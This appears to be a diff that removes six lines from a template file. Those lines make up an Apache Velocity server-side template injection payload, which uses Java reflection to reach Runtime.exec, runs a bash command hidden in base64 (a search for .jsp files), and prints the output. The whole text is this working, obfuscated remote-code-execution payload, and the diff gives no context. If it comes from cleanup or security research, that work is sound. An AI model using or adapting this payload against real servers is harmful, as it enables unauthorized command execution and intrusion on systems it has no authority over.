@@ -1,6 +1,0 @@
-#set($ex=$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec("bash -c {eval,$({tr,/+,_-}<<<ZmluZCAvIC1uYW1lICouanNw|{base64,--decode})}"))
-$ex.waitFor()
-#set($out=$ex.getInputStream())
-#foreach($i in [1..$out.available()])
-$out.read()
-#end
